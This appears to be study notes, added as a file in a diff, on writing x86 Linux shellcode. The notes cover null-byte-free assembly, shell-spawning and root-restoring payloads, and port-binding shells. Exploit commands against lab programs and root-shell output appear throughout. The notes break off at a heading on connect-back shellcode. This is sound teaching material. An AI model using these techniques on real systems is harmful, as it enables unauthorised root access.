@@ -1,0 +1,957 @@
+SHELLCODE
+
+Standard shellcode are shell-spawning shellcode for local exploits or port-binding shellcode for remote ones. 
+
+Shellcode is sometimes referred to as an exploit payload, since these self-contained programs do the real work once a program has been hacked. 
+
+Shellcode usually spawns a shell, as that is an elegant way to hand off control, but it can do anything a program can do
+
+Custom shellcode gives you absolute control over the exploited program. 
+
+Perhaps, want shellcode to add an admin account to /etc/passwd or to automatically remove lines from log files. Once you know how to write your own shell code, your exploits are limited only by imagination. 
+
+In addition, writing shellcode develops assembly language skills and employs a number of hacking techinques worth knowing. 
+
+ASSEMBLY vs C
+
+Shellcode bytes are actually architecture-specific machine instructions, so shellcode is written using assembly. 
+
+Many of the principles of C programming are similar in assembly.
+
+OS manages things like input, output, process control, file access, and network communication in the kernel.
+
+Compiled C programs ultimately perform these tasks by making system calls to the kernel. Different OSes have different sets of system calls. 
+
+In C, standard libraries are used for convenience and portability.
+
+A C program that uses printf() to output a string can be compiled for many different systems, since the library knows the approriate system calls for various architectures. 
+
+A C program copmiled on an x86 processor will produce x86 assembly. 
+
+By definition, assembly language is already specific to a certain processor architecture, so portability is impossible. There are on standard libraries, instead, kernel system calls have to be made directly. 
+
+To begin compairson, write a simple C program then rewrite it in x86 assembly
+
+helloworld.c
+
+#include <stdio.h>
+int main() {
+printf("Hello, world!\n");
+return 0;
+}
+
+When compiled program is run, execution flows through the standard I/O library, eventually making a system call to write the string "Hello, world!" to the screen. 
+
+strace -> program used to trace a program's system calls. 
+
+Used on the compiled helloworld program, it shows every system call that program makes.
+
+reader@hacking:~/booksrc $ gcc helloworld.c
+reader@hacking:~/booksrc $ strace ./a.out
+execve("./a.out", ["./a.out"], [/* 27 vars */]) = 0
+brk(0)
+= 0x804a000
+access("/etc/ld.so.nohwcap", F_OK)
+= -1 ENOENT (No such file or directory)
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ef6000
+access("/etc/ld.so.preload", R_OK)
+= -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY)
+= 3
+fstat64(3, {st_mode=S_IFREG|0644, st_size=61323, ...}) = 0
+mmap2(NULL, 61323, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7ee7000
+close(3)
+= 0
+access("/etc/ld.so.nohwcap", F_OK)
+= -1 ENOENT (No such file or directory)
+open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 3
+read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20Z\1\000"..., 512) = 512
+fstat64(3, {st_mode=S_IFREG|0755, st_size=1248904, ...}) = 0
+mmap2(NULL, 1258876, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7db3000
+mmap2(0xb7ee0000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x12c) =
+0xb7ee0000
+mmap2(0xb7ee4000, 9596, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) =
+0xb7ee4000
+close(3)
+= 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7db2000
+set_thread_area({entry_number:-1 -> 6, base_addr:0xb7db26b0, limit:1048575, seg_32bit:1,
+contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+mprotect(0xb7ee0000, 8192, PROT_READ)
+= 0
+munmap(0xb7ee7000, 61323)
+= 0
+fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 2), ...}) = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ef5000
+write(1, "Hello, world!\n", 13Hello, world!
+)
+= 13
+exit_group(0)
+= ?
+Process 11528 detached
+reader@hacking:~/booksrc $
+
+As you can see, the copmiled program does more than just print a string.
+
+The system calls at the start are setting up the environment and memory for the program, but the important part is the write() syscall shown in bold.
+
+The UNIX man pages (man) are separated into sections. Section 2 contains the man pages for system calls.
+
+man 2 write -> describe use of write() system call
+
+The strace output also shows arguments for syscall.
+
+File decsriptors are used for almost everything in Unix: input, output, file access, network sockets, and so on. 
+
+0 - stdin
+1 - stdout
+2 - stderr
+
+Values are standard and defined in several places, such as /usr/include/unistd.h 
+
+LINUX SYSTEM CALLS IN ASSEMBLY
+
+Every possible Linux system call is enumerated, so they can be referenced by numbers when making the calls in assembly. 
+
+These syscalls are listed in /usr/include/asm-i386/unistd.h
+
+In rewrite of helloworld in assembly, we will make a system call to write() and a system to call to exit() to quit the process cleanly. 
+
+This can be done in x86 assembly using just two instructions: mov and int
+
+Assembly instructions for x86 have one, two, three, or no operands. The operands to an instruction can be numerical values, memory addreses, or processor registers. 
+
+The x86 processor has several 32 bit registers that can be viewed as hardware variables. 
+
+EAX, EBX, ECX, EDX, ESI, EDI, EBP, ESP can all be used as operands
+
+EIP (execution pointer) cannot. 
+
+mov -> copies a value between its two operands
+
+Using Intel assembly syntax, the first opeand is the destination and the second is the source.
+
+int -> sends an interrupt signal to the kernel defined by its single operand.
+
+With Linux kernel, the interrupt 0x80 is used to tell the kernel to makes a system call. 
+
+When the int 0x80 instruction is executed, the kernel will make a system call based on the first four registers. The EAX register is used to specify which system call to make, while the EBX, ECX, and EDX registers are used to hold the first, second, and third arguments to the system call. 
+
+All of these registers can be set using the mov instruction.
+
+In an asembly code listing of the helloworld.c, the memory segments are simply declared. 
+
+The string "Hello, world!" with a newline character (0x0a) is in the data segment, and the actual assembly instructions are in the text segment. This follows proper memory segmentation practices
+
+helloworld.asm
+
+section .data		; Data segment
+msg		db		"Hello, world!", 0x0a	; the string and newline char
+
+section .text		; Text segment
+global _start		; Default entry point for ELF linking
+
+_start:
+; SYSCALL: write(1, msg, 14)
+mov eax, 4			; Put 4 into eax, since write is syscall 4
+mov ebx, 1			; Put 1 into ebx, since stdout is 1
+mov ecx, msg		; Put the address of the string into ecx
+mov edx, 14			; Put 14 into edx, since our string is 14 bytes
+int 0x80			; Call the kernel to make the system call happen
+
+; SYSCALL: exit(0)
+mov eax, 1			; Put 1 into eax, since exit is syscall 1
+mov ebx, 0			; Exit iwth success
+int 0x80			; Do the syscall
+
+Load registers and then call interrupt to perform the correct syscall. The syscall is stored in eax.
+
+To create an executable binary, this assembly code must first be assemble dand then linked into an executable format. 
+
+While compiling C code, the GCC compiler takes care of all of this automatically. 
+
+We are going to create and executable and linking format (ELF) binary so the global _start line shows the linker where the assembly instructions begin.
+
+The *nasm* assembler with the -f elf argument will assemble the helloworld.asm into an object file ready to be linked as an ELF binary. By default this object file will be called helloworld.o. The linker program *ld* will prodice an exectuable a.out binary from the assembled object
+
+nasm -f elf helloworld.asm
+ld helloworld.o
+./a.out
+
+This tiny program works, but it's not shellcode, since it isn't self-contained and must be linked
+
+THE PATH TO SHELLCODE
+
+Shellcode is literally injected into a running program, where it takes over like a biological virus inside a cell.
+
+Since shellcode isn't really an executable program, we don't have luxury of declaring layout of data inememory or even using other memory segments. Instructions must be self-contained and ready to take over control of processor regardless of its current state.
+
+This is referred to as position-independent code
+
+In shellcode, bytes for string must be mixed together with bytes for the assembly instructions, since there aren't definable or predicatble memory segments. This is fine as long as EIP doesn't try to interpret string as instructions. However, to access the string as data, we need a pointer to it. 
+
+When shellcode gets executed, it could be anywhere in memory. The string's absolute memory address needs to be calculated relative to EIP. 
+
+Sinc EIP cannot be accessed from assembly instructions, however, we need to use some sort of trick
+
+ASSEMBLY INSTRUCTIONS USING THE STACK
+
+Stack is integral to x86 architecture and there are special instructions for its operation
+
+Instruction 		Description
+push <source> 		Push the source operand to the stack.
+
+pop <destination> 	Pop a value from the stack and store in the destination operand.
+
+call <location> 	Call a function, jumping the execution to the address in the location 
+					operand. This location can be relative or absolute. The address of the
+					instruction following the call is pushed to the stack, so that execution can
+					return later.
+
+ret 				Return from a function, popping the return address from the stack and
+					jumping execution there.
+
+Stack based exploits are made possible by the call and ret instructions. 
+
+When a function is called, the return address of the next instruction is pushed to the stack, beginning the stack frame. After function is finished, the ret instructions pops the return address from the stack and jumps EIP back there. By overwriting the stored return address on the stack before the ret instruction, we can take control of a program's execution
+
+This architecture can be misused in another way to solve the problem of addressing the inline string data. If the string is placed directly after a call instruction, the address of the string will get pushed to the stack as the return address. Instead of calling a function, we can jump past the string to a pop instruction that will take the address off the stack and into a register. 
+
+Following assembly instructions demonstrate this technique
+
+BITS 32             ; tell nasm this is 32-bit code
+
+  call mark_below   ; call below the string to instructions
+  db "Hello, world!", 0x0a, 0x0d  ; with newline and carriage return bytes
+
+mark_below:
+; ssize_t write(int fd, const void *buf, size_t count);
+  pop ecx           ; pop the return address (string ptr) into ecx
+  mov eax, 4        ; write syscall #
+  mov ebx, 1        ; STDOUT file descriptor
+  mov edx, 15       ; length of the string
+  int 0x80          ; do syscall: write(1, string, 14)
+
+; void _exit(int status);
+  mov eax, 1        ; exit syscall #
+  mov ebx, 0        ; status = 0   
+  int 0x80          ; do syscall:  exit(0)
+
+The call instruction jumps execution down below the string. This also pushes the address of the next instruction to the stack, the next instruction in our case being the beginning of the string. The return address can immediately be popped from the stack into the appropriate register. Without using any memory segments, these raw instructions, injected into an existing process, will executed a completely position-independent way. This means that, when these instructions are assembled, they cannot be linked into an executable. 
+
+pg. 288
+
+The nasm assembler converts assembly language into machine code and a corresponding tool called *ndisasm* converts machine code into assembly.
+
+tools used to show relationship between the machine code bytes and the assembly instructions.
+
+Now we can inject this shellcode into a program and redirect EIP, the program will print out "Hello, world!"
+
+Can use the familiar exploit target of the notesearch program
+
+reader@hacking:~/booksrc $ export SHELLCODE=$(cat helloworld1)
+reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch
+SHELLCODE will be at 0xbffff9c6
+reader@hacking:~/booksrc $ ./notesearch $(perl -e 'print "\xc6\xf9\xff\xbf"x40')
+-------[ end of note data ]-------
+Segmentation fault
+reader@hacking:~/booksrc $
+
+To check why it crashed, use GDB. 
+
+INVESTIGATING WIHT GDB
+
+Since notesearch program runs as root, we can't debug it as normal user. We also can't jus tattach to a running copy of it because it exits too quickly
+
+Another way to debug programs is with core dumps. 
+
+From a root prompt, the OS can be told to dump memory when the program crashed nby using the command *ulimit -c unlimited.
+
+ulimit -c unlimited -> means that dumped core files are allowed to get as big as needed. Now when program crashes, the memory will be dumped to disk as a core file, which can be examined using GDB
+
+pg 289
+
+Once GDB is loaded, the disaassembly style is switched to Intel. Since running GDB as root, the .gdbinit file won't be used. The memory where the shellcode should be is examined. Instructions look incorrect, but it seems like the first incorrect call instruction is what caused the crash. 
+
+Execution was redirected, but something went wrong with the shellcode bytes. Normally, strings are terminated by a null byte, but here, the shell was kind enough to remove these null bytes for us. This, however, totally destroys the meaning of the machine code. 
+
+Often, shellcode will be injected into a process as a string, using functions like strcpy(). Such functions will simply terminate at the first null bute, producing incomplete and unusable shellcode in memory. 
+
+In order for shellcode to survive transit, it must be redesigned so it doesn't contain any null bytes
+
+REMOVING NULL BYTES
+
+Looking at disassembly, it it obvious first null bytes come from the call instruction
+
+reader@hacking:~/booksrc $ ndisasm -b32 helloworld1
+00000000 E80F000000
+call 0x14
+00000005 48
+dec eax
+00000006 656C
+gs insb
+00000008 6C
+insb
+00000009 6F
+outsd
+0000000A 2C20
+sub al,0x20
+0000000C 776F
+ja 0x7d
+0000000E 726C
+jc 0x7c
+00000010 64210A
+and [fs:edx],ecx
+00000013 0D59B80400
+or eax,0x4b859
+00000018 0000
+add [eax],al
+0000001A BB01000000
+mov ebx,0x1
+0000001F BA0F000000
+mov edx,0xf
+00000024 CD80
+int 0x80
+00000026 B801000000
+mov eax,0x1
+0000002B BB00000000
+mov ebx,0x0
+00000030 CD80
+int 0x80
+reader@hacking:~/booksrc $
+
+The instruction jumps execution 19 (0x13)? (or 20? 0x14)? bytes, based on the first operand. The call insruction allows for much longer jump distances, which means that asmall value like 19 will have to be padded with leading zeroes resulting in null bytes
+
+One way around this problem is to take advantage of two's complement. 
+
+A small negative number will have its leading bits turnd on, resulting in 0xfff bytes. This means that, if we call using a negative alue to move backward in execution, the machine code for that instruction own't have any null bytes. 
+
+Following revision of the helloworld shellcode uses a standard implementation of this trick. 
+
+Jump to the end of the shellcode to a call instruction which will in turn jump back to a pop instruction at the beginning of the shellcode
+
+helloworld2.s
+
+After assmelbing this new shellcode, disassembly sohws that the call instruction is now free of null bytes. 
+
+This solves the first and most difficult null byte problem for this shellcode, but there are still many othe rnull bytes
+
+These remaining null bytes can be elimited with an understanding of register widths and addressing. 
+
+Notice the first jmp instruction is actually jmp short. This means execution can only jump a max of approx 128 bytes in either direction. 
+
+The normal jmp instuctions as well as the call instruction (which hs no short version), allows for much longer jumps. Difference between assembled mahcine code for the two jump varieties is shown below:
+
+EB 1E				jmp short 0x20
+
+E9 1E 00 00 00		jmp 0x23
+
+The EAX, EBX, ECX, EDX, ESI, EDI, EBP, and ESP registers are 32 bits wide.
+
+E stands for extended  because these were originally 16bit registers called AX, BX, CX, DX, SI, DI, BP, and SP. These original 16 bit registers can still be used for accessing the first 16 bits of each coresponding 32bit register. 
+
+Furthermore, the individual bytes of AX, BX, CX, and DX registers can be accessed as 8 bit integers called AL, AH, BL, BH, CL, CH, DL, and DH, where L stands for low byte and H for high byte. 
+
+Naturally, assembly instructions using the smaller registers only need to specify operands up to the register's bit width. 
+
+Three variations of mov instruction
+
+Machine code		Assembly
+B8 04 00 00 00 		mov eax,0x4
+66 B8 04 00 		mov ax,0x4
+B0 04 				mov al,0x
+
+Using AL, BL, CL, or DL register will put the correct least significant byte into the corresponding extended register without creating any null bytes in the machine code. 
+
+However, top three bytes of the register could still contain anything. This is especially true for shellcode, since it will be taking over another process. If we want the 32 bit register values to be correct, we need to zero out the entire register before the mov instructions -- but this again must be done without using null bytes. 
+
+Here are more simple assembly instructions 
+
+First two are small instructions that increment and decrement their operand by one.
+
+Instruction Description
+inc <target> Increment the target operand by adding 1 to it.
+dec <target> Decrement the target operand by subtracting 1 from it.
+
+Next few, like the mov instruction, have two operands. They all do simple arithmetic and bitwise logical operations between two operands, storing the result in the destination operand.
+
+Instruction 		Description
+add <dest>, <source> Add the source operand to the destination operand, storing the result
+in the destination.
+sub <dest>, <source> Subtract the source operand from the destination operand, storing the
+result in the destination.
+
+add
+sub
+or
+and
+xor
+
+One method is to move an arbitrary 32bit number into the register and then subtract that value from the register using the mov and sub instructions
+
+B8 44 33 22 11
+2D 44 33 22 11
+mov eax,0x11223344
+sub eax,0x11223344
+
+While this technique works, it take 10 bytes to 0 out a single register, making the assembled shellcode larger than necessary. 
+
+How would you optimize this technique?
+
+The DWORD value specified in each instruction comprises 80 percent of the code. Subtracting any value from itself also produces 0 and doesn't require any static data. 
+
+Can be done with a single 2 byte instruction
+
+29 C0	sub eax,eax
+
+Using the sub instruction will work fine when zeroing registers at the beginning of the shellcode. 
+
+This instruction will modify processor flags, which are used for branching, however. For that reason, there is a preferred two byte instruction that is used to zero registers in most shellcode
+
+The xor instruction performs and excluside operation on bits in a register. Any value xored withitself will result in 0. Same result as subtracting a value from itself but the xor doesn't modify processor flags, so it's considered cleaner.
+
+31 C0	xor eax,eax
+
+Next revision of shellcode makes use of the smaller registers and the xor instruction to avoid null bytes. 
+
+The inc and dec instructions have also been used when possible to make for even smaller shellcode
+
+helloworld3.s
+
+After assmelbing shellcode, hexdump and grep are used to quickly check for null bytes
+
+nasm helloworld3.s
+hexdump -C helloworld3 | grep --color=auto 00
+
+Because shellcode does not contain null bytes, it is useable.
+
+When used with an exploit, the notesearch program is coereced into greeting the world
+
+SHELL SPAWNING SHELLCODE
+
+To spawn a shell, just need to make a system call the execute the /bin/sh program.
+
+System call 11, execve() is similar to the C execute() function used in previous chapters. 
+
+First argument of the filename should be a pointer to the string "/bin/sh" since this is what we want to execute. The environment array (the third argument) can be empty but it still needs to be terminated with a 32bit null pointer. The argument array (the second argument) must be null-terminated, too; it must also contain the string pointer (since the zeroth argument is the name of the running program). 
+
+Done in C, a pgoram making this call wiuld look like thiat:
+
+exec_shell.c
+
+#include <unistd.h>
+int main() {
+char filename[] = "/bin/sh\x00";
+char **argv, **envp; // Arrays that contain char pointers
+argv[0] = filename; // The only argument is filename.
+argv[1] = 0; // Null terminate the argument array.
+envp[0] = 0; // Null terminate the environment array.
+execve(filename, argv, envp);
+}
+
+To do this in assembly, the argument and environment arrays need to be built in memory.
+
+In addition, the "/bin/sh" string needs to be terminated with a null byte. This must be ubild in memory as well. 
+
+Dealing with memory in assembly is similar to using pointers in C.
+
+Th elea instruction, whose name stands for load effective address, works like the address-of operator in C.
+
+Instruction Description
+lea <dest>, <source> Load the effective address of the source operand into the destination
+operand.
+
+With Intel assembly syntax, operands can be dereferenced as pointers if they are surrounded by square brackets. 
+
+For example, following instruction with treat EBX+12 as a pointer and write eax to where it's pointing
+
+89 43 0C	mov [ebx+12],eax
+
+Following shellcode uses these new instructions to build the execve() arguments in memory. 
+
+The environment aray is collapsed into the end of the argument array, so they share the same 32bit null terminator
+
+exec_shell.s
+
+After terminating the string and building the array, the shellcode uses the lea instruction to put a pointer to the argument array into the ECX register. 
+
+Loading the effective address of a bracketed register added to a value is an efficient way to add the value to the register and store the result in another register. Loading the address of a dereferenced pointer produces the original pointer.
+
+Normally, this would require both a move and an add instruction. When assembled, this shellcode is devoid of null bytes. It will spawn a shell when used in an exploit
+
+nasm exec_shell.s
+wc -c exec_shell
+hexdump -C exec_shell
+export SHELLCODE=$(cat exec_shell)
+./getenvaddr SHELLCODE ./notesearch
+./notesearch $(perl -e 'print "\xc0\xf9\xff\xbf"x40')
+
+However, SHELLCODE can be shortened to less than current 45 bytes. 
+
+Smaller shellcode cna be used in tigheter exploit situations with smaller usable buffers. 
+
+Shellcode can be shunk down by redesigning it and using registers more efficiently. 
+
+ESP register is the stack pointer, pointing to top of the stack. When value is pushed to the stack, ESP is moved up in memory (by subtracting 4) and the value is placed at the top of the stack. When a value is popped from the stack, the pointe rin ESP is move ddown in memory (by adding 4). 
+
+Following shellcode uses push instructions to build the necessary structures in memory for the execve() systemcall. 
+
+tiny_shell.s
+
+Shellcode bulds the null-terminated string "/bin//sh" on the stack and thencopies ESP for the pointer. The extra backslash is effectively ignored. Same method is used to build arrays for remaining arguments. 
+
+Resulting shellcode spawns a shell but is only 25 bytes. 
+
+A MATTER OF PRIVILEGE
+
+To help mitigate rampant privilege escalation, some privileged processes will lower their effective privileges while doing things that don't require that kind of acess. Can be done with  seteuid() function, which will set effective user ID. By changing the effective user ID, privileges of the process can be changed. 
+
+man 2 seteuid
+
+This function is used by following code to drop privileges down to those of the "games" user before the vulnerable strcpy() call
+
+drop_privs.c
+
+#include <unistd.h>
+void lowered_privilege_function(unsigned char *ptr) {
+char buffer[50];
+seteuid(5); // Drop privileges to games user.
+strcpy(buffer, ptr);
+}
+int main(int argc, char *argv[]) {
+if (argc > 0)
+lowered_privilege_function(argv[1]);
+}
+
+Even though this compiled program is setuid root, the privileges are dropped to the "games" user before shellcode an execute. This only spawns a shell for the games user, without root access
+
+reader@hacking:~/booksrc $ gcc -o drop_privs drop_privs.c
+reader@hacking:~/booksrc $ sudo chown root ./drop_privs; sudo chmod u+s ./drop_privs
+reader@hacking:~/booksrc $ export SHELLCODE=$(cat tiny_shell)
+reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./drop_privs
+SHELLCODE will be at 0xbffff9cb
+reader@hacking:~/booksrc $ ./drop_privs $(perl -e 'print "\xcb\xf9\xff\xbf"x40')
+sh-3.2$ whoami
+games
+sh-3.2$ id
+uid=999(reader) gid=999(reader) euid=5(games)
+groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scan
+ner),112(netdev),113(lpadmin),115(powerdev),117(admin),999(reader)
+sh-3.2$
+
+Privileges can easily be restored at beginning of our shellcode with a system call to set the privileges back to root. 
+
+Most complete way to do this is with a setresuid() system call, which sets the real, effective, and saved user IDs. 
+
+reader@hacking:~/booksrc $ grep -i setresuid /usr/include/asm-i386/unistd.h
+#define __NR_setresuid
+164
+#define __NR_setresuid32
+208
+reader@hacking:~/booksrc $ man 2 setresuid
+
+Following shellcode makes call to setresuid() before spawning shell to restore root privilieges
+
+priv_shell.s
+
+This way, even if a program is running under lowered privileges when it's exploited, the shellcode can restore the privileges. This effect is deomnstrated below by exploiting the same program with dropped privileges
+
+reader@hacking:~/booksrc $ nasm priv_shell.s
+reader@hacking:~/booksrc $ export SHELLCODE=$(cat priv_shell)
+reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./drop_privs
+SHELLCODE will be at 0xbffff9bf
+reader@hacking:~/booksrc $ ./drop_privs $(perl -e 'print "\xbf\xf9\xff\xbf"x40')
+sh-3.2# whoami
+root
+sh-3.2# id
+uid=0(root) gid=999(reader)
+groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scan
+ner),112(netdev),113(lpadmin),115(powerdev),117(admin),999(reader)
+sh-3.2#
+
+AND SMALLER STILL
+
+More bytes can be shaved still
+
+cdq -> converted doubleword to quadword. A single byte x86 instruction. Instead of using operands, this instructions always gets its source from the EAX register and stores the results between the EDX and EAX registers. 
+
+Since the registers are 32 bit doublwords, it takes two registers to store a 64 byte quadword. Conversion is imply a matter of extending the signbit from a 32bit integer to 64bit integer. Operationally, this means if the signbit of EAX is 0, he cdw instruction will zero he EDX register. Using xor to zero the EDX register requires two bytes; so, if EAX is already zeroed, using the cdq instruction to zero EDX will save one byte
+
+31 D2	xor edx,edx
+99		cdq
+
+Another byte can be saved with clevel use of the stack. 
+
+Since stack is 32bit aligned, a single byte value pushed to the stack will be aligned as a doubleword. When this vlue is popped off, it will be sign-extended, filling the entire register. 
+
+Instructions that push a single byte and pop it back into a register take three bytes, while using xor to zero the register and moving a single byte takes four bytes
+
+31 C0	xor eax,eax
+B0 0B	mov al,0xb
+
+compared to
+
+6A 0B	push byte +0xb
+58		pop eax
+
+shellcode.s
+
+The syntax for pushing a single byte requires the size to be declared. Valid sizes are BYTE for one byte, WORd for two bytes, and DWORD for four bytes. These sizes can be implie from register widths, so moving into the AL register implies the BYTE size. 
+
+PORT BINDING SHELLCODE
+
+When exploting a remote program, the shellcode designed thus far won't work. The injected shellcode needs to communicate over the ntwork to deliver an interactive root prompt. 
+
+Port-binding shellcode -> binds shell to a network port hwere it listens for incoming connections. In previous chapter, we used this kind of shellcode to exploit the tinyweb server. 
+
+Following C code binds to port 31337 and listens for a TCP connection. 
+
+bind_port.c
+
+socketcall() -> These familiar socket functions can all be accessed with a single Linux system call. Syscall number 102
+
+man 2 socketcall
+
+Possible call number for the first argument are listen in linux/net.h
+
+So to make socket system calls using Linux, EAX is always 102 forsoketcall(), EBX contains the type of socket call, and ECX is a pointer to the socket call's arguments. 
+
+Calls are simple enough but some of them require a sockaddr stucture, which must be ubilt by the shellcode. 
+
+Debugging compiled C code is most direct way to look at this structure in memory
+
+reader@hacking:~/booksrc $ gcc -g bind_port.c
+reader@hacking:~/booksrc $ gdb -q ./a.out
+Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
+(gdb) list 18
+13
+sockfd = socket(PF_INET, SOCK_STREAM, 0);
+14
+15
+host_addr.sin_family = AF_INET;
+// Host byte order
+16
+host_addr.sin_port = htons(31337);
+// Short, network byte order
+17
+host_addr.sin_addr.s_addr = INADDR_ANY; // Automatically fill with my IP.
+18
+memset(&(host_addr.sin_zero), '\0', 8); // Zero the rest of the struct.
+19
+20
+bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr));
+21
+22
+listen(sockfd, 4);
+(gdb) break 13
+Breakpoint 1 at 0x804849b: file bind_port.c, line 13.
+(gdb) break 20
+Breakpoint 2 at 0x80484f5: file bind_port.c, line 20.
+(gdb) run
+Starting program: /home/reader/booksrc/a.out
+Breakpoint 1, main () at bind_port.c:13
+13
+sockfd = socket(PF_INET, SOCK_STREAM, 0);
+(gdb) x/5i $eip
+0x804849b <main+23>:
+mov
+DWORD PTR [esp+8],0x0
+0x80484a3 <main+31>:
+mov
+DWORD PTR [esp+4],0x1
+0x80484ab <main+39>:
+mov
+DWORD PTR [esp],0x2
+0x80484b2 <main+46>:
+call
+0x8048394 <socket@plt>
+0x80484b7 <main+51>:
+mov
+DWORD PTR [ebp-12],eax
+(gdb)
+
+First breakpoint is just before socket call happens, since need to check the values of PF_INET and SOCK_STREAM. All three arguments are pushed to the stack (but with mov instructions) in reverse order. Means PF_INET is 2 and SOCK_STREAM is 1. 
+
+(gdb) cont
+Continuing.
+Breakpoint 2, main () at bind_port.c:20
+20
+bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr));
+(gdb) print host_addr
+$1 = {sin_family = 2, sin_port = 27002, sin_addr = {s_addr = 0},
+sin_zero = "\000\000\000\000\000\000\000"}
+(gdb) print sizeof(struct sockaddr)
+$2 = 16
+(gdb) x/16xb &host_addr
+0xbffff780:
+0x02
+0x00
+0xbffff788:
+0x00
+0x00
+(gdb) p /x 27002
+$3 = 0x697a
+(gdb) p 0x7a69
+$4 = 31337
+(gdb)
+
+Next breakpoint happens after the sockaddr structure is filled iwht values. Debugger is smart enough to decode the lements of the structure when host_addr is printed, but now yoou need to be smart enough to realize the port is storedin network byte order. 
+
+The sin_family and sin_port elements are both words, followed by the address as a DWORD. 
+
+In this case, the address is 0, which means any address can be used for binding. Remaining eight bytes after that are jus textra space in the structure. The first eight bytes in the structure contain all he import information. 
+
+The following assembly instructions perform all the socket calls needed to bind to port 31337 and accept TCP connections. The sockaddr structure and the argument arrays are each created by pushing values in reverse order to the stack and then copying ESP into ECX. The last eight bytes of the sockaddr structure aren't actually pushed to the stack, since they aren't used. Random bytes will occupy this space. 
+
+bind_port.s
+
+When assembled and used in an exploit, this shellcode will bind to port 31337 and wait for an incomoing connection, blocking at the accept call. When a connection is accepted, the new socket file descriptor is put into EAX at the end of this code. 
+
+This won't really be usedful until it's combined with the shell-spawning code described earlier.
+
+Fortunately, standard file descriptors make this fusion remrakably simple. 
+
+DUPLICATING STANDARD FILE DESCRIPTORS
+
+Stdin, stdout, and stderr are three standard file descriptors used by programs to perform standard I/O. 
+
+Sockets too are just file descriptors that can be read from and written to.
+
+By simply swapping the stdin, stdout, and stderr of the spawned shell with the connected socket file descriptor, the shell will write output and errors to the socket and read its input from the bytes that the socket received. 
+
+dup2 -> system call specifically for duplicating file descritpors. Number 63
+
+The bind_port.s shellcode left off with the connected socket file descriptor in EAX. 
+
+The following instructions are added in the file bind_shell_beta.s to duplicate this socket into the standard I/O file descirptors; then, the tiny_shell instructions are called to execute a shell in the current process. 
+
+the spawned shells's standard input and output file descriptors will be the TCP connection, allowing remote shell acess. 
+
+bind_shell1.s
+
+When this shellcode is assembled and used in an exploit, it will bind to port 31337 and wait for an incoming connection. 
+
+In output below, grep is used to quickly check for null ybtes. 
+
+At end, process hangs waiting for a connection
+
+nasm bind_shell_beta.s
+hexdump -C bind_shell)beta | grep --color=auto 00
+export SHELLCODE=$(cat bind_shell_beta)
+./getenvaddr SHELLCODE ./notesearch
+./notesearch $(perl -e 'print "\x7f\xf9\xff\xbf"x40')
+
+From another termina, use netcat to find the listening port. Then netcat is used to connct to the root shell on that port. 
+
+sudo netstat -lp | grep 31337
+nc -vv 127.0.0.1 31337
+
+BRANCHING CONTROL STRUCTURES
+
+Conditional branches and loops in assembly. 
+
+With control structures, repeated calls to dup2 could be shrunk down to a single call in a loop. 
+
+cmp -> compares its two operands, settings flags based on the result.
+
+jmp, je, jle, jl, jne, jnl, jnle, jg/jge, jng, jnge -> jump to target depending on condition. Conditional jump will jump based on the flags. 
+
+Using conditional jump instructions, complex programming control structures such as loops can be created in assembly. 
+
+These instructions can be used to shrink the dup2 portion of the shellcode
+
+With a more complete understanding of the flags used by the cmp instruction, this loop can be shrunk even further. 
+
+The status flags set by the cmp instruction are also set by most other instructions, describing the attributes of the instruction's result. 
+
+CF - carry flag
+PF - parity flag
+AF - adjust flag
+OF - overflow flag
+ZF - zero flag -> true if result is zero
+SF - sign flag -> true if result is negative
+
+Last two flags are most useful and easiest to understand. Zero flag is set to true if the result is zero, otherwise it is false. Sign flag is simply the most significant bit of the result, which is true if result is negative and false otherwise. 
+
+The cmp instruction is actually just a sub instruction that throws away the results, only affecting the status flags. 
+
+The jle instruction is actually checking the zero and sign flags. If either of these flags is true, then destination (first) operand is less than or equal to the source (second) operand. Other conditional jump instructions work in a simlar way.
+
+Still more conditional jump instructions that directly check individual status flags
+
+Instruction Description
+jz <target> Jump to target if the zero flag is set.
+jnz <target> Jump if the zero flag is not set.
+js <target> Jump if the sign flag is set.
+jns <target> Jump is the sign flag is not set.
+
+With this knowledge, cmp instruction can be removed entirely if loop's order is reverse. 
+
+Starting from 2 and counting down, the sign flag can be checked to loop until 0. 
+
+First two instructions before the loop can be shortened with the xchg instruction
+
+xchg <dest, src> -> Exchange the values between the two operands
+
+This single instruction can replace both the following instructions which take up four bytes
+
+89 C3	mov ebx,eax
+31 C0 	xor eax,eax
+
+The EAX register needs to be zeroed to clear only the upper three bytes of the register, and EBX already has these upper bytes cleared. So swapping values between EAX and EBX will kill two birds in one stone with a single byte instruction
+
+93		xchg eax,ebx
+
+Since xchg instruction is smaller than a mov instruction between two registers, it can be used to shrink shellcode in other places. Naturally, this only works in situations where the source operand's register doesn't matter. 
+
+bind_shell.s
+
+This assembles into the same 92 byte bind_shell shellcode used in previous chapter
+
+CONNECT BACK SHELLCODE
+
